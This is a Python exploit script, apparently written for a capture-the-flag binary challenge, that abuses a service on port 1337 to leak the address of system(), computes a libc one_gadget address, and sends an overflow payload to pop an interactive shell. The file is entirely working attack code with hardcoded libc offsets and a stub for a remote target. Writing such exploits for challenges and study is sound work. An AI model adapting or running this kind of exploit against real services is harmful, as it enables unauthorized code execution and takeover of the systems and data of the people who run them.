import socket
import struct
import telnetlib
from time import sleep


# Local
target_host = "localhost"
target_port = 1337

# Remote
#target_host = ""
#target_port = 1337

def p64(data):
	return struct.pack('<Q',data)

def p32(data):
	return struct.pack('<I',data)

def u64(data):
	return struct.unpack('<Q',data)[0]

def u32(data):
	return struct.unpack('<I',data)[0]

def sock():
	s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
	s.connect((target_host,target_port))
	return s

def interactive(s):
	print("[!!!] GOT A SHELL!")
	t = telnetlib.Telnet()
	t.sock = s
	t.interact()

def debug_print(prompt,value,formatting = 16):
	if formatting == 16:
		print("[+] " + prompt + "= {0:x}".format(value))
	else:
		print("[+] " + prompt + "= {0:d}".format(value))

def write_buf(data):
	fd = open('buf','wb')
	fd.write(data)
	fd.close()


def main():
	# main exploit here

	s = sock()

	# important value define
	

	binsh_offset = 0x18cd57
	one_gadget_offset = 0x45216
	system_offset = 0x45390

	# send and recv
	sleep(1)
	print("[+]" + s.recv(1024)) # Welcome to an easy...

	# Get libc base address
	s.send("2\n")
	sleep(1)
	print("[+]" + s.recv(1024))
	s.send("system\n")
	system_addr_str = s.recv(1024)
	print("[+]" + system_addr_str)
	
	system_addr = int(system_addr_str[15:33],16)
	print("[!] system_addr : {0:x}".format(system_addr))


	# calculate offset
	libc_base_addr = system_addr - system_offset
	print("[!] libc_base_addr : {0:x}".format(libc_base_addr))
	one_gadget_addr = libc_base_addr + one_gadget_offset
	print("[!] one_gadget_addr : {0:x}".format(one_gadget_addr))
	sleep(1)

	# Create payload
	buf = 'AAAAAAAA' # rbp
	buf += p64(one_gadget_addr)
	buf += '\n'

	buf_len = len(buf)

	print("[+]" + s.recv(1024)) # Menu
	s.send("3\n")
	sleep(1)
	print("[+]" + s.recv(1024)) # Enter bytes to send
	s.send(str(buf_len)+ "\n")
	s.send(buf)

	sleep(1)
	print("[+]" + s.recv(1024))
	s.send("4\n")
	


	# interactive

	interactive(s)


if __name__ == '__main__':
	main()





